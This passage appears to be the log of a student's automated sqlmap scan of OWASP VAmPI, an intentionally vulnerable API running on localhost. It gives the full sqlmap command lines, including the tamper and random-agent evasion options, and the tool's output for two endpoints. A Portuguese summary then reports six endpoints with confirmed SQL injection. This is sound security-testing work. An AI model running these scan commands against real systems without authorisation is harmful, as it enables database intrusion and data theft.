+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:5002/books/v1/nonexistent_book" --headers="Authorization: Bearer a"
+
+  [?] Resultado inconclusivo para books_get_by_title_inject
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[)]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [(]     | .'| . |
+  |___|_  [(]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:26:26 /2026-06-01/
+  
+  [00:26:26] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output' as the output directory
+  [00:26:26] [INFO] loading tamper module 'space2comment'
+  [00:26:26] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:26:27] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:26:27] [INFO] testing connection to the target URL
+  [00:26:27] [CRITICAL] not authorized, try to provide right HTTP authentication type and valid credentials (401). If this is intended, try to rerun by providing a valid value for option '--ignore-code'
+  [00:26:27] [WARNING] HTTP error codes detected during run:
+  401 (Unauthorized) - 1 times
+  
+  [*] ending @ 00:26:27 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[21/21] Testando: books_add
+  Método:    POST
+  Path:      /books/v1
+  Descrição: Adicionar novo livro
+  Auth:      Sim (Bearer JWT)
+  Body:      {"book_title": "sqlmap_test_book", "secret": "secret_content_test"}
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:5002/books/v1" --method=POST --data='{"book_title": "sqlmap_test_book", "secret": "secret_content_test"}' --headers="Authorization: Bearer a\nContent-Type: application/json"
+
+  [?] Resultado inconclusivo para books_add
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[)]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [,]     | .'| . |
+  |___|_  [(]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:26:27 /2026-06-01/
+  
+  [00:26:27] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output' as the output directory
+  [00:26:27] [INFO] loading tamper module 'space2comment'
+  [00:26:27] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:26:27] [INFO] testing connection to the target URL
+  [00:26:27] [WARNING] the web server responded with an HTTP error code (400) which could interfere with the results of the tests
+  [00:26:27] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:26:27] [INFO] testing if the target URL content is stable
+  [00:26:28] [INFO] target URL content is stable
+  [00:26:28] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1')
+  [00:26:28] [WARNING] HTTP error codes detected during run:
+  400 (Bad Request) - 3 times
+  
+  [*] ending @ 00:26:28 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+
+================================================================================
+  RESUMO FINAL - OWASP VAmPI
+================================================================================
+  Total de endpoints testados:  21
+  Endpoints pulados:            0
+  Vulnerabilidades encontradas: 6
+  Erros durante execução:       0
+
+  ENDPOINTS VULNERÁVEIS:
+    - [GET] /createdb (createdb)
+      -> SQL Injection confirmada
+    - [GET] /users/v1 (users_list)
+      -> SQL Injection confirmada
+    - [GET] /users/v1/_debug (users_debug)
+      -> SQL Injection confirmada
+      -> DBMS identificado
+    - [GET] /users/v1/name1 (users_get_by_username)
+      -> SQL Injection confirmada
+      -> DBMS identificado
+    - [GET] /users/v1/admin (users_get_by_username_admin)
+      -> SQL Injection confirmada
+      -> DBMS identificado
+    - [GET] /books/v1 (books_list)
+      -> SQL Injection confirmada
+
+  Log salvo em: C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\resultado_20260601_002556.txt
+  Saídas sqlmap em: C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output
+================================================================================
